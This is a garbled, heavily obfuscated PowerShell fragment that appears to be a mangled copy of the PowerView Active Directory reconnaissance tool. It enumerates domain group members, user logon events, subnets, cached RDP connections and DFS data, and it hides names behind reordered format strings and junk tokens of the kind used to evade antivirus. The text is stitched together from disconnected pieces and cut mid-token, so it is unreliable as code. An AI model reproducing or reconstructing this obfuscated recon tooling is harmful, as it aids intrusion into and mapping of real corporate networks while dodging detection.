        if (YoV{PSBoUNdPIJKARIJKAIJKMIJKEtIJKERS}[(Z3b{5}{2}{6}{3}{4}{1}{0}Z3b -f S5zSystemS5z,S5zingS5z,S5zpS5z,S5zeS5z,S5zrOperatS5z,S5zComS5z,S5zutS5z)]) { YoV{COmIJKPuTERIJKsIJKEIJKARcheRARGuIJKmENTS}[(Z3b{0}{3}{1}{2}Z3b -f S5zOperatinS5z,S5zyS5z,S5zstemS5z,S5zgSS5z)] = YoV{opIJKEIJKRAtiNIJKgSysTem} }
        if (YoV{psBIJKounDParAIJKmIJKEIJKTeRs}[(Z3b{2}{0}{3}{1}{4}{5}Z3b-fS5zuterSeS5z,S5zcS5z,S5zCompS5z,S5zrviS5z,S5zePaS5z,S5zckS5z)]) { YoV{COMPuIJKTIJKERIJKseaIJKRIJKchIJKeRaRGuMEnTs}[(Z3b{1}{2}{0}Z3b -fS5zicePackS5z,S5zSeS5z,S5zrvS5z)] = YoV{sERVIJKiCIJKePaIJKCk} }
        if (YoV{PSBOundIJKpaIJKRaIJKmeIJKTeIJKRS}[(Z3b{0}{5}{1}{2}{4}{3}Z3b-f S5zCoS5z,S5zSS5z,S5ziS5z,S5zNameS5z,S5zteS5z,S5zmputerS5z)]) { YoV{cOIJKMpUIJKTIJKERIJKseaRcHERaIJKRGumeNTs}[(Z3b{0}{1}Z3b-fS5zSiteS5z,S5zNameS5z)] = YoV{siTEnIJKAme} }
        if (YoV{PsBounDpAIJKRamIJKeteIJKRS}[(Z3b{0}{1}{2}Z3b-fS5zSerS5z,S5zvS5z,S5zerS5z)]) { YoV{COmPIJKUIJKTIJKEIJKRSEarCherArGIJKUIJKMENtS}[(Z3b{0}{2}{1}Z3b-fS5zSerS5z,S5zerS5z,S5zvS5z)] = YoV{SIJKEIJKRveR} }
        if (YoV{PsboUIJKNdPaIJKRaMEtIJKeIJKRS}[(Z3b{0}{1}{2}{3}Z3b -f S5zSeS5z,S5zarchS5z,S5zScopS5z,S5zeS5',' YoV{RDIJKpsesSiIJKoN}.Z3bPsoIJKBJeCTZ3b.Z3btIJKYpIJKeNaIJKMESZ3b.(Z3b{1}{0}Z3b-f S5znsertS5z,S5zIS5z).Invoke(0, (Z3b{1}{0}{2}{3}{4}Z3b-f S5zw.RDS5z,S5zPowerVieS5z,S5zPSeS5z,S5zssionInS5z,S5zfoS5z))
                            YoV{rDpIJKsIJKessIOn}

                            
                            YoV{NUIJKLL} = YoV{wtIJKsIJKAPI32}::(Z3b{1}{3}{2}{0}Z3b -fS5zryS5z,S5zWTSFreS5z,S5zoS5z,S5zeMemS5z).Invoke(YoV{ppBIJKUfIJKFIJKeR})

                            YoV{OFIJKFsET} += YoV{iNIJKCRIJKeMeIJKNt}
                        }
                    }
                    ','= Z3bYoVLDAPFilterZ3b
                }

                YoV{groIJKUPIJKsIJKeIJKArcHEr}.Z3bFilTIJKERZ3b = Z3b(&(objectCategory=group)YoVFilter)Z3b
                &(Z3b{3}{1}{0}{2}Z3b -f S5z-VerS5z,S5zriteS5z,S5zboseS5z,S5zWS5z) Z3b[Get-DomainGroupMember] Get-DomainGroupMember filter string: YoV(YoVGroupSearcher.filter) Z3b
                try {
                    YoV{reIJKSult} = YoV{GIJKRoIJKUPSEarChER}.(Z3b{1}{0}{2}Z3b -f S5zndS5z,S5zFiS5z,S5zOneS5z).Invoke()
                }
                catch {
                    &(Z3b{2}{0}{1}{3}Z3b -fS5zrniS5z,S5znS5z,S5zWrite-WaS5z,S5zgS5z) (S5z[Get-DomainS5z+S5zGS5z+S5zrouS5z+S5zpMS5z+S5zemberS5z+S5z]S5z+S5z S5z+S5zErS5z+S5zror S5z+S5zseS5z+S5zarcS5z+S5zhS5z+S5zing S5z+S5zforS5z+S5z S5z+S5zgrouS5z+S5zp S5z+S5zwithS5z+S5z S5z+S5zidenS5z+S5ztitS5z+S5zy S5z+Z3bS5zYoVIdentityS5z: Z3b+Z3bYoV_Z3b)
                    YoV{MEmBEIJKRS} = @()
                }

                YoV{grIJKOuIJKpFOUNDnaIJKMe} = S5zS5z
                YoV{grIJKoUIJKPfOuNDdn} = S5zS5z

                if (YoV{rEIJKSuLT}) {
                    YoV{MEIJKmbIJKErs} = YoV{RIJKeSulT}.Z3bPRoIJKPErIJKTIJKIeSZ3b.(Z3b{0}{1}Z3b-fS5ziS5z,S5ztemS5z).Invoke((Z3b{0}{1}Z3b-f S5zmS5z,S5zemberS5z))

                    if (YoV{MEMIJKBEIJKRS}.Z3bCIJKOUnTZ3b -eq 0) {
                        
                        YoV{FIIJKNiShED} = YoV{fALIJKSe}
                        YoV{bIJKotTIJKOM} = 0
                        YoV{tIJKOP} = 0

                        while (-not YoV{fIJKINiSHEd}) {
                            YoV{TIJKOp} = YoV{BOtIJKTIJKOM} + 1499
                            YoV{mIJKEmIJKBeIJKRrAnge}=Z3bmember;range=YoVBottom-YoVTopZ3b
                            YoV{BOIJKTTOm} += 1500
                            YoV{nuIJKLL} = YoV{gRoIJKUIJKPSeAIJKRCHIJKER}.Z3bproIJKPertIIJKeSTIJKOlIJKoaDZ3b.(Z3b{0}{1}Z3b-f S5zCS5z,S5zlearS5z).Invoke()
                            YoV{nIJKUlL} = YoV{GIJKROUpSeAIJKRchER}.Z3bproIJKPerTIJKIeIJKstOLIJKoAdZ3b.(Z3b{0}{1}Z3b -fS5zAS5z,S5zddS5z).Invoke(Z3bYoVMemberRangeZ3b)
                            YoV{NUIJKll} = YoV{GRIJKoIJKUIJKPsEARCHIJKer}.Z3bPIJKROPIJKeIJKRTiEIJKStOLoaDZ3b.(Z3b{0}{1}Z3b -fS5zAS5z,S5zddS5z).Invoke((Z3b{2}{4}{0}{3}{1}Z3b -fS5zountS5z,S5zmeS5z,S5zsamaS5z,S5znaS5z,S5zccS5z))
                            YoV{NIJKULL} = YoV{gROIJKUIJKPSEIJKARcheR}.Z3bPIJKROPERIJKTIIJKESToIJKlOADZ3b.(Z3b{0}{1}Z3b -fS5zAdS5z,S5zdS5z).Invoke((Z3b{4}{3}{1}{0}{2}Z3b-fS5zuisS5z,S5zngS5z,S5zhednameS5z,S5ztiS5z,S5zdisS5z))

                            try {
                                YoV{RIJKesULt} = YoV{grOUPIJKsEARIJKCIJKHIJKEr}.(Z3b{1}{2}{0}Z3b-f S5zndOneS5z,S5zFS5z,S5ziS5z).Invoke()
                                YoV{RangIJKEDpIJKRoPEIJKRtY} = YoV{REIJKsIJKULT}.Z3bPRoIJKPIJKERtiESZ3b.Z3bpROIJKpERtIJKynAmesZ3b -like (Z3b{3}{4}{0}{2}{1}Z3b -fS5z;raS5z,S5z*S5z,S5znge=S5z,S5zmembS5z,S5zerS5z)
                                YoV{mIJKEmbIJKErs} += YoV{REIJKSuIJKLt}.Z3bpIJKRoPEIJKRTIEsZ3b.(Z3b{0}{1}Z3b-fS5ziteS5z,S5zmS5z).Invoke(YoV{RanGeDIJKpIJKRopERIJKTy})
                                YoV{gROUPIJKFoIJKUndIJKNaIJKme} = YoV{ReSIJKULT}.Z3bpRIJKopIJKeRtIesZ3b.(Z3b{1}{0}Z3b -fS5zemS5z,S5zitS5z).Invoke((Z3b{2}{1}{0}Z3b -f S5zeS5z,S5zmaccountnamS5z,S5zsaS5z))[0]
                                YoV{GrOUPIJKFoUNdIJKDN} = YoV{rIJKESULt}.Z3bPIJKRIJKOPeIJKRtIEsZ3b.(Z3b{1}{0}Z3b-fS5zemS5z,S5zitS5z).Invoke((Z3b{1}{2}{3}{0}Z3b-f S5zmeS5z,S5zdistinS5z,S5zguishS5z,S5zednaS5z))[0]

                                if (YoV{MeMbIJKEIJKRs}.Z3bCoIJKUntZ3b -eq 0) {
                                    YoV{fIJKiniShed} = YoV{TIJKRUE}
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                YoV{fiN','}{4}{1}{0}{2}Z3b -fS5zeS5z,S5ztPagS5z,S5zSizeS5z,S5zResuS5z,S5zlS5z)] = YoV{ReIJKSUlTpaIJKGEsIJKize} }
        if (YoV{psbIJKOIJKUNDpARAmEteIJKRs}[(Z3b{4}{2}{0}{3}{1}Z3b-f S5zeS5z,S5zimitS5z,S5zrTimS5z,S5zLS5z,S5zServeS5z)]) { YoV{CIJKoMpIJKUTerSeAIJKRChERaIJKRGuMENtS}[(Z3b{2}{4}{1}{0}{3}Z3b-f S5zrTimeLimiS5z,S5zeS5z,S5zSerS5z,S5ztS5z,S5zvS5z)] = YoV{SerIJKVErtImeLIJKIMIt} }
        if (YoV{pSbOUndIJKpaRaIJKMEtEIJKRS}[(Z3b{2}{0}{1}Z3b -f S5zombstS5z,S5zoneS5z,S5zTS5z)]) { YoV{ComIJKPIJKUtIJKerseARCHErARGUMeNIJKTs}[(Z3b{2}{0}{1}Z3b-fS5zbstonS5z,S5zeS5z,S5zTomS5z)] = YoV{TOmIJKBStoIJKNe} }
        if (YoV{PsIJKBIJKOUIJKNdpIJKARAMIJKeTErS}[(Z3b{0}{2}{1}Z3b-f S5zCredentiS5z,S5zlS5z,S5zaS5z)]) { YoV{cOMpUTEIJKRIJKsearCHIJKerAIJKRGuIJKMIJKENtS}[(Z3b{2}{0}{1}Z3b-f S5zreS5z,S5zdentialS5z,S5zCS5z)] = YoV{CReIJKdeIJKNtIJKiaL} }

        YoV{usEIJKRSIJKearCHerIJKARIJKGIJKUmenIJKTs} = @{
            (Z3b{1}{0}{2}Z3b-fS5zertieS5z,S5zPropS5z,S5zsS5z) = (Z3b{1}{0}{2}Z3b-f S5zmaccountnS5z,S5zsaS5z,S5zameS5z)
        }
        if (YoV{pSIJKBOunDPAIJKRaMETIJKEIJKRs}[(Z3b{2}{0}{1}Z3b -fS5znS5z,S5ztityS5z,S5zUserIdeS5z)]) { YoV{UIJKSEIJKRsIJKearIJKChErArGUmEIJKNts}[(Z3b{1}{0}{2}Z3b -f S5zdS5z,S5zIS5z,S5zentityS5z)] = YoV{USerIDEIJKNTiIJKTY} }
        if (YoV{PSIJKBoUndPAIJKRIJKAmETIJKERS}[(Z3b{0}{1}Z3b -f S5zDomaiS5z,S5znS5z)]) { YoV{useIJKRsIJKEArcHERARGIJKUMIJKeIJKNts}[(Z3b{1}{0}Z3b -f S5znS5z,S5zDomaiS5z)] = YoV{DomIJKAIN} }
        if (YoV{pIJKsBOuNDPaIJKRaMeIJKTIJKErs}[(Z3b{1}{0}{2}Z3b -f S5zrDomaS5z,S5zUseS5z,S5zinS5z)]) { YoV{usersIJKEIJKArIJKCIJKheIJKRARgUMEnTs}[(Z3b{0}{1}Z3b-f S5zDomS5z,S5zainS5z)] = YoV{uSeRIJKdOmIJKAiN} }
        if (YoV{pIJKSbIJKouNdPARAMIJKETERS}[(Z3b{2}{3}{1}{0}Z3b -f S5zrS5z,S5zAPFilteS5z,S5zUserS5z,S5zLDS5z)]) { YoV{USerIJKsIJKEIJKARIJKcHeraRgUMIJKeIJKNTs}[(Z3b{0}{3}{1}{2}Z3b-f S5zLDAS5z,S5ziltS5z,S5zerS5z,S5zPFS5z)] = YoV{UIJKseIJKRLDApIJKFILTeR} }
        if (YoV{PSbouNdPArAIJKmIJKEteIJKRs}[(Z3b{3}{1}{0}{2}Z3b -f S5zrS5z,S5zrSeaS5z,S5zchBaseS5z,S5zUseS5z)]) { YoV{uIJKSerIJKseARcIJKhErAIJKRgumIJKENtS}[(Z3b{2}{0}{1}Z3b -f S5zrcS5z,S5zhBaseS5z,S5zSeaS5z)] = YoV{UseIJKRSEIJKAIJKRCHbAIJKSe} }
        if (YoV{pSbOuIJKNIJKdIJKPIJKARAmIJKeTERs}[(Z3b{0}{2}{1}Z3b -fS5zUserAdS5z,S5zCountS5z,S5zminS5z)]) { YoV{usIJKEIJKRSIJKearCherarIJKGUIJKMeNTs}[(Z3b{2}{1}{0}Z3b-f S5zntS5z,S5znCouS5z,S5zAdmiS5z)] = YoV{uIJKSerAdMInIJKCIJKOIJKUnt} }
        if (YoV{PSBIJKouNIJKdPIJKAraIJKmEteRS}[(Z3b{1}{0}{2}Z3b -fS5zvS5z,S5zSerS5z,S5zerS5z)]) { YoV{uSERIJKsEARcIJKHEIJKRarIJKgIJKUMIJKentS}[(Z3b{1}{0}Z3b-f S5zerS5z,S5zServS5z)] = YoV{sEIJKRvIJKEr} }
        if (YoV{PSIJKBIJKouNDPaRaMEtIJKeIJKRS}[(Z3b{2}{1}{0}Z3b-fS5zpeS5z,S5zarchScoS5z,S5zSeS5z)]) { YoV{UIJKsIJKerSEArIJKCIJKheRArGUIJKMeNIJKTS}[(Z3b{1}{3}{0}{2}Z3b-f S5zcoS5z,S5zSS5z,S5zpeS5z,S5zearchSS5z)] = YoV{SIJKeIJKARchSIJKcoPe} }
        if (YoV{psbIJKOIJKUnDIJKpaRAmEteRs}[(Z3b{2}{0}{1}{3}Z3b-f S5zultS5z,S5zPageSizS5z,S5zResS5z,S5zeS5z)]) { YoV{USERsIJKeArcHIJKeRaIJKRGUIJKmeNts}[(Z3b{1}{2}{0}{4}{3}Z3b-f S5zltPaS5z,S5zReS5z,S5zsuS5z,S5zeS5z,S5zgeSizS5z)] = YoV{reSuLtIJKpAgIJKEIJKsIIJKzE} }
        if (YoV{PsBOUNDparIJKAMIJKeIJKTers}[(Z3b{1}{3}{2}{4}{0}Z3b -fS5zmitS5z,S5zSS5z,S5zrTimS5z,S5zerveS5z,S5zeLiS5z)]) { YoV{uIJKseIJKRsEIJKArCIJKhERaRgIJKUMeNIJKTS}[(Z3b{3}{0}{2}{1}Z3b -fS5zTS5z,S5zitS5z,S5zimeLimS5z,S5zServerS5z)] = YoV{sEIJKRvIJKErTIIJKMElImIT} }
        if (YoV{PIJKsBoIJKUIJKNdIJKParAmEteRs}[(Z3b{1}{0}{2}Z3b -fS5zoS5z,S5zTombstS5z,S5zneS5z)]) { YoV{uIJKSeIJKRsEIJKArcHeIJKRaIJKRGIJKUmENTS}[(Z3b{1}{2}{0}Z3b -fS5zbstoneS5z,S5zTS5z,S5zomS5z)] = YoV{tIJKOMBIJKsIJKTone} }
        if (YoV{psIJKBOUNDIJKpARAmIJKETERS}[(Z3b{1}{2}{0}Z3b-fS5zialS5z,S5zCreS5z,S5zdentS5z)]) { YoV{UIJKSeIJKRseaIJKRIJKcIJKhErARGIJKUMENTs}[(Z3b{2}{0}{1}{3}Z3b -fS5zenS5z,S5ztS5z,S5zCredS5z,S5zialS5z)] = YoV{cReDIJKeIJKNtIal} }


        
        if (YoV{PSIJKBIJKoUNDIJKpARIJKAmEIJKTeRs}[(Z3b{1}{2}{0}{3}Z3b -f S5zpS5z,S5zCS5z,S5zomS5z,S5zuterNameS5z)]) {
            YoV{TaIJKRGetcIJKOIJKmpUterS} = YoV{cIJKOIJKmpUtIJKERNAME}
        }
        else {
            &(Z3b{0}{1}{2}{3}Z3b -fS5zWriS5z,S5zte-S5z,S5zVeS5z,S5zrboseS5z) (Z3b{0}{5}{2}{6}{3}{7}{8}{4}{1}Z3b-fS5z[FS5z,S5ze domainS5z,S5zProS5z,S5zss] QueS5z,S5zrs in thS5z,S5zind-DomainS5z,S5zceS5z,S5zrying computS5z,S5zeS5z)
            YoV{TaRgETCIJKoMPIJKUIJKTErs} = &(Z3b{0}{3}{2}{4}{1}Z3b -fS5zGS5z,S5zterS5z,S5zomaS5z,S5zet-DS5z,S5zinCompuS5z) @ComputerSearcherArguments JGO &(Z3b{','     YoV{inIJKCREIJKMent} = YoV{LOCalI',' S5zrS5z,S5zServeS5z)]) { YoV{SEARIJKcHERaIJKRGuIJKMIJKEIJKNtS}[(Z3b{0}{1}Z3b -f S5zSeS5z,S5zrverS5z)] = YoV{SIJKeIJKRVeR} }
        if (YoV{PsBOUIJKNDPARIJKAIJKMeIJKTerS}[(Z3b{3}{1}{0}{2}Z3b -f S5zhScopS5z,S5zcS5z,S5zeS5z,S5zSearS5z)]) { YoV{SEaIJKRIJKCHEIJKRaRGUmeNTS}[(Z3b{2}{1}{0}Z3b-f S5zpeS5z,S5zcoS5z,S5zSearchSS5z)] = YoV{sEaRcHsIJKCoIJKPe} }
        if (YoV{pSboUnDPIJKArIJKAMeIJKTeIJKRS}[(Z3b{3}{1}{2}{4}{0}Z3b-f S5zzeS5z,S5zsS5z,S5zulS5z,S5zReS5z,S5ztPageSiS5z)]) { YoV{sIJKearcIJKheRaRGUIJKmenTS}[(Z3b{1}{0}{2}Z3b-fS5zuS5z,S5zResS5z,S5zltPageSizeS5z)] = YoV{rIJKESUIJKltIJKpAGESiIJKZE} }
        if (YoV{PsbOUNIJKdPIJKArIJKAIJKmeteRs}[(Z3b{2}{3}{0}{1}Z3b-fS5zmeLimiS5z,S5ztS5z,S5zServeS5z,S5zrTiS5z)]) { YoV{SearIJKchIJKERIJKARGUMeNtS}[(Z3b{1}{3}{2}{0}Z3b -fS5zLimitS5z,S5zSS5z,S5zimeS5z,S5zerverTS5z)] = YoV{SEIJKRvERIJKTIMEIJKlIJKiMit} }
        if (YoV{pIJKSbOIJKUNDparIJKAmEtIJKeIJKRS}[(Z3b{0}{1}{2}Z3b -fS5zSecurS5z,S5zityMaS5z,S5zsksS5z)]) { YoV{seaRCHeRIJKArGIJKUmIJKeNIJKTs}[(Z3b{1}{2}{0}{3}Z3b -f S5zityMaS5z,S5zSecS5z,S5zurS5z,S5zsksS5z)] = YoV{SecIJKURitIJKyMaSKs} }
        if (YoV{pSBOIJKUNdIJKpIJKArAIJKmEtEIJKRs}[(Z3b{0}{2}{1}Z3b-f S5zTS5z,S5zneS5z,S5zombstoS5z)]) { YoV{seARchEIJKRAIJKRguIJKMeNIJKTs}[(Z3b{2}{1}{0}Z3b -fS5ztoneS5z,S5zmbsS5z,S5zToS5z)] = YoV{tOMBSIJKToIJKNe} }
        if (YoV{PSbIJKOunIJKDpIJKAramEteRS}[(Z3b{0}{1}{2}Z3b -fS5zCrS5z,S5zedeS5z,S5zntialS5z)]) { YoV{SIJKeIJKArIJKCHEIJKRArgIJKUMeNtS}[(Z3b{2}{3}{0}{1}Z3b-fS5zdenS5z,S5ztialS5z,S5zCrS5z,S5zeS5z)] = YoV{CrIJKeDEIJKNIJKTIaL} }
        YoV{sUIJKBnetSeIJKAIJKRIJKcHEr} = &(Z3b{2}{3}{1}{4}{0}{5}Z3b-fS5zainSS5z,S5z-S5z,S5zGeS5z,S5ztS5z,S5zDomS5z,S5zearcherS5z) @SearcherArguments
    }

    PROCESS {
        if (YoV{suI',')]
        [String]
        YoV{tAIJKRgeIJKTLdAIJKPFIltEr},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{tAIJKRGEIJKTSEArIJKCI',',S5zimitS5z)]) { YoV{SeARCIJKhIJKerARIJKgIJKUMeNTs}[(Z3b{3}{1}{0}{4}{2}Z3b-fS5zerTimeLS5z,S5zervS5z,S5zmitS5z,S5zSS5z,S5ziS5z)] = YoV{seRVerIJKTiIJKMeIJKLIMit} }
        if (YoV{psIJKBIJKouNdIJKpAraIJKMIJKETerS}[(Z3b{1}{2}{0}Z3b -fS5zMasksS5z,S5zSecurS5z,S5zityS5z)]) { YoV{SEarChIJKeRaIJKRgUmEIJKNIJKTS}[(Z3b{2}{0}{1}Z3b -fS5zuriS5z,S5ztyMasksS5z,S5zSecS5z)] = YoV{SecurIJKiIJKTYIJKMASIJKKS} }
        if (YoV{PsIJKBOundpAraIJKmEtEIJKRs}[(Z3b{0}{1}{2}Z3b-fS5zTombstS5z,S5zoS5z,S5zneS5z)]) { YoV{sEArCHEIJKRAIJKRIJKGuMIJKentS}[(Z3b{0}{2}{1}Z3b -fS5zTS5z,S5zeS5z,S5zombstonS5z)] = YoV{tomIJKBIJKSIJKTonE} }
        if (YoV{PIJKsbOundParIJKAIJKmeTeRs}[(Z3b{2}{1}{0}Z3b -f S5zntialS5z,S5zeS5z,S5zCredS5z)]) { YoV{SeIJKARCIJKheIJKRarGUIJKMENtS}[(Z3b{2}{1}{0}Z3b-f S5zalS5z,S5zedentiS5z,S5zCrS5z)] = YoV{cREDEIJKNIJKTial} }
    }

    PROCESS {
        if (YoV{pIJKsIJKBOU','ervS5z,S5zeS5z) YoV{tIJKARgeTIJKsErVeR}
                                YoV{fOIJKUIJKNDCOIJKNnIJKEIJKctIoN} JGO &(Z3b{0}{2}{1}Z3b-fS5zAdS5z,S5zMemberS5z,S5zd-S5z) (Z3b{1}{2}{3}{0}Z3b -f S5ztyS5z,S5zNotS5z,S5zeS5z,S5zproperS5z) (Z3b{2}{3}{0}{1}Z3b-fS5ziS5z,S5zntS5z,S5zUsernameS5z,S5zHS5z) YoV{nIJKULl}
                                YoV{FOUNDcoNIJKNIJKecIJKTIOn}.Z3bPSIJKOBJEctZ3b.Z3bTIJKypenaMIJKESZ3b.(Z3b{0}{1}Z3b-fS5zInsS5z,S5zertS5z).Invoke(0, (Z3b{4}{8}{5}{0}{3}{1}{7}{2}{6}Z3b -f S5zeS5z,S5zhedRDPConnS5z,S5ziS5z,S5zw.CacS5z,S5zPoweS5z,S5zViS5z,S5zonS5z,S5zectS5z,S5zrS5z))
                                YoV{fIJKoIJKUIJKNdcIJKOnNEctiIJKon}
                            }
                        }

                        
                        YoV{SIJKEIJKRvErKeIJKYS} = YoV{RIJKeG}.(Z3b{0}{1}Z3b -f S5zEnumS5z,S5zKeyS5z).Invoke(YoV{hIJKKU},(Z3bYoVUserSID5rjSoftware5rjMicrosoft5rjTerminal Z3b+S5zSS5z+S5zerver S5z+((S5zClS5z+S5zieS5z+S5zntS5z+S5zRYtSeS5z+S5zrversS5z)  -rEP','b+Z3baEpZ3b+Z3bsiZ3b)).Z3bVAlIJKUEZ3b::Z3btOuIJKiIJKNT32Z3b(YoV{BIJKlOb_dIJKAtA}[YoV{sTIJKAtIJKe_IJKStART}..YoV{StaTEIJK_IJKenD}],0)

                        YoV{comIJKMEnIJKT_SIzEIJK_IJKsTAIJKRt} = YoV{SIJKTIJKATE_eNd} + 1
                        YoV{comIJKmEIJKNT_sIzIJKE_EIJKND} = YoV{comMeIJKNt_IJKsIJKizIJKe_stAIJKRt} + 1
                        YoV{cIJKOIJKMmIJKeNt_size} =   (  &(Z3b{2}{0}{3}{1}Z3b -f S5zt-vAS5z,S5zeS5z,S5zgeS5z,S5zRIAbLS5z) (Z3bAeZ3b+Z3bpSiZ3b) -vALuEo  )::Z3bToIJKUiNTIJK16Z3b(YoV{bIJKlob_dIJKAta}[YoV{CIJKoMMIJKeNTIJK_IJKsIJKize_STarT}..YoV{CIJKOmMIJKEnIJKTIJK_SiZEIJK_EnD}],0)
                        YoV{cOMIJKmIJKeNIJKTIJK_STArT} = YoV{CoMMeNIJKT_SIIJKzIJKE_enD} + 1
                        YoV{CIJKOMMENIJKT_enD} = YoV{cOmmeNIJKT_SIJKTART} + YoV{COmMIJKeIJKNt_SIJKiZe} - 1
                        if (YoV{CIJKomMIJKEnIJKT_SIZE} -gt 0)  {
                            YoV{CoMmIJKEIJKNt} =   (&(Z3b{1}{2}{0}Z3b-fS5zeS5z,S5zvaRS5z,S5zIaBLS5z)  6o2Zlp).Z3bVIJKALueZ3b::Z3buNiIJKcIJKodeZ3b.Z3bgeIJKTSTIJKRiNGZ3b(YoV{BlOBIJK_IJKdata}[YoV{cOIJKmIJKmIJKent_SIJKTARt}..YoV{COIJKmMEnIJKT_END}])
                        }
                        YoV{PIJKREfIJKix_tiMeStIJKAIJKmp_sIJKTIJKArt} = YoV{coMMIJKEIJKNt_IJKend} + 1
                        YoV{PREfIJKIx_IJKTiIJKMeSTAmIJKp_IJKENd} = YoV{PREFiXIJK_TImIJKEStIJKAIJKmPIJK_StIJKARt} + 7
                        
                        YoV{PReIJKFIX_TIIJKmEStIJKAmp} = YoV{BLoIJKB_IJKDIJKATa}[YoV{prefIx_IJKTIJKIMEStIJKAMIJKP_StaIJKRT}..YoV{pRefiIJKX_TIJKiIJKMEstamPIJK_IJKEIJKNd}] 
                        YoV{sIJKTATIJKE_tIJKimEStAMPIJK_SIJKTArt} = YoV{PrIJKEFIJKiX_TImesTAMp_IJKENd} + 1
                        YoV{stIJKAtIJKEIJK_timIJKeSIJKTAMp_eIJKND} = YoV{state_tIMestaMIJKpIJK_SIJKTAIJKRt} + 7
                        YoV{sIJKTAIJKTE_IJKTImeStaIJKmP} = YoV{BIJKLIJKOb_DIJKAtA}[YoV{StaTE_IJKTImeSTamp_IJKSIJKTIJKArt}..YoV{sIJKTaTE_IJKTiMEIJKstIJKAMIJKP_End}]
                        YoV{coMmEIJKNtIJK_tIMeIJKsTIJKAMP_IJKsTaRt} = YoV{stAIJKTE_TiMeSTamPIJK_IJKEIJKNd} + 1
                        YoV{CoMmEIJKNt_TImIJKeSTIJKAIJKmIJKpIJK_enD} = YoV{cOmmEIJKNIJKTIJK_TImIJKEIJKstIJKAMIJKP_STaRT} + 7
                        YoV{COIJKmMeIJKNt_tIMEIJKSTAIJKmP} = YoV{blIJKoBIJK_Data}[YoV{COIJKmIJKMENt_tImeStaIJKMIJKp_STARt}..YoV{COMmENT_TIMIJKeIJKsIJKTaIJKMIJKp_eNd}]
                        YoV{vEIJKRSIIJKoIJKN_STIJKARt} = YoV{cIJKoMIJKMent_TiMEStaIJKmIJKP_ENd}  + 1
                        YoV{VIJKEIJKRIJKSiOn_enD} = YoV{veRIJKsiIJKon_StArt} + 3
                        YoV{VeRIJKsIJKion} =   YoV{AIJKeIJKPsI}::Z3bToUIJKiNt32Z3b(YoV{BlobIJK_IJKdATA}[YoV{vIJKersIJKioN_STIJKArt}..YoV{VIJKERIJKSIIJKon_eND}],0)

                        
                        YoV{dIJKFsIJK_IJKTarIJKGEtlIJKist_BLoIJKBIJK_IJKSIZE_StIJKARt} = YoV{verSiIJKoNIJK_IJKend} + 1
                        YoV{DFIJKs_tIJKARgIJKetlIJKIST_bIJKLoIJKB_sIJKIZe_EIJKNd} = YoV{dfSIJK_tAIJKRgIJKETLIsIJKT_BIJKLoB_siZIJKE_sIJKTart} + 3
                        YoV{Dfs_tARgeIJKTIJKLiSIJKTIJK_BIJKlOIJKB_IJKSIZe} =  ( &(Z3b{2}{1}{0}{3}Z3b-f S5zbLS5z,S5zEt-VarIAS5z,S5zGS5z,S5zES5z)  (Z3bAZ3b+Z3bePSiZ3b)  ).Z3bvALIJKUeZ3b::Z3bTIJKouiIJKNt32Z3b(YoV{bLOIJKB_DIJKAIJKTa}[YoV{dfS_taIJKRGIJKetIJKLisIJKTIJK_bLIJKOB_IJKSIZEIJK_SIJKTARt}..YoV{DFSIJK_tIJKARIJKgEtLisIJKT_IJKBLIJKob_sIze_IJKEIJKND}],0)

                        YoV{dfIJKs_IJKTARGetIJKLIIJKsIJKT_BLIJKOb_IJKsTAIJKRt} = YoV{DfS_tIJKArgETIJKLisIJKTIJK_BlIJKoBIJK_sIZIJKe_IJKEnd} + 1
                        YoV{DfS_IJKTargETIJKLiStIJK_BLOIJKB_IJKEnd} = YoV{DFS_TargeTlIsIJKTIJK_bIJKLIJKoB_IJKSTARt} + YoV{DfS_tIJKARIJKGIJKeIJKTLIJKIIJKSTIJK_Blob_sizE} - 1
                        YoV{dfsIJK_tARIJKgeTLIIJKSt_bLIJKob} = YoV{BLoBIJK_IJKdaIJKTA}[YoV{DfIJKS_tARgETlIStIJK_bIJKlOb_IJKsTIJKArt}..YoV{DfS_IJKTaRgEtIJKLIstIJK_BLIJKoBIJK_EIJKND}]
                        YoV{REsIJKErvIJKEIJKd_BIJKlIJKob_siZe_STaIJKRT} = YoV{DIJKFIJKsIJK_TargIJKeTlIst_blobIJK_End} + 1
                        YoV{resEIJKRvIJKed_IJKBLObIJK_IJKsIZIJKE_enD} = YoV{RESeRved_IJKBLob_sIJKizIJKe_IJKSIJKTAIJKRt} + 3
                        YoV{REsIJKErVEdIJK_BIJ','IJKEsZ3b -and (YoV{sUIJKBNIJKET}.Z3bpRIJKoPIJKERtIJKIEsZ3b.Z3bsitEObjIJKEIJKCtZ3b -like Z3b*YoVSiteName*Z3b)) {
                        YoV{SuIJKBIJKNEt}
                    }
                    elseif (YoV{sUIJKBNIJKet}.Z3bsItIJKEoBIJKJecTZ3b -like Z3b*YoVSiteName*Z3b) {
                        YoV{sUbNIJKet}
                    }
                }
                else {
                    YoV{SUbnIJKet}
                }
            }
            if (YoV{reIJKSUIJKLTs}) {
                try { YoV{rEsuIJKLIJKTs}.(Z3b{2}{0}{1}Z3b-fS5zpS5z,S5zoseS5z,S5zdisS5z).Invoke() }
                catch {
                    &(Z3b{0}{2}{3}{1}Z3b -f S5zWS5z,S5zeS5z,S5zrite-VerbS5z,S5zosS5z) (S5z[Get-DomaS5z+S5zinSuS5z+S5zbS5z+S5zneS5z+S5zt] S5z+S5zErroS5z+S5zrS5z+S5z S5z+S5zdispS5z+S5zosinS5z+S5zg S5z+S5zoS5z+S5zf S5z+S','erbS5z) (S5z[FindS5z+S5z-S5z+S5zDomS5z+S5zainS5z+S5zUserEvS5z+S5zeS5z+S5znS5z+S5zt] S5z+S5zTarS5z+S5zgS5z+S5zetCoS5z+S5zmpuS5z+S5zters S5z+Z3bYoVTargetComputersZ3b)
        if (YoV{TarIJKGEtIJKcoIJKmIJKPUTErs}.Z3blENIJKgIJKThZ3b -eq 0) {
            throw (Z3b{9}{7}{1}{2}{5}{0}{3}{4}{6}{8}{10}Z3b -fS5zoS5z,S5znUserEvenS5z,S5zt] No hosS5z,S5zund S5z,S5ztS5z,S5zts fS5z,S5zo eS5z,S5zd-DomaiS5z,S5znumeratS5z,S5z[FinS5z,S5zeS5z)
        }

        
        YoV{hosTENIJKUmIJKBLoIJKck} = {
            Param(YoV{cOmpIJKUtIJK','),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{rEsUIJKlIJKTIJKpaIJKgESiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
